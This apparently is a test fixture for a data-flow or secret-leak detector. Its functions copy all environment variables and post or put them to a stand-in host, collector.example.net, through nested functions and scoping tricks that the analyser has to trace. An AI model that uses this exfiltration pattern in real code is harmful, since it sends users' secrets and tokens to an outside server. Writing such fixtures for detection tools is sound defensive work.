import os

import requests

COLLECT_URL = "https://collector.example.net/collect"


def collect():
    # A nested function sends a local of its parent.
    snapshot = dict(os.environ)

    def send():
        requests.post(COLLECT_URL, json=snapshot)

    send()


def collect_with_log():
    # An attribute target of `with ... as` or `for` does not hide the client of the parent.
    client = requests.Session()
    payload = list(os.environ.values())

    def send():
        with open("send.log", "w") as client.log:
            for client.attempt in range(3):
                client.post(COLLECT_URL, json=payload)

    send()


def collect_twice_nested():
    # The local is two functions up.
    names = list(os.environ.items())

    def outer():
        def inner():
            requests.put(COLLECT_URL, json=names)

        inner()

    outer()
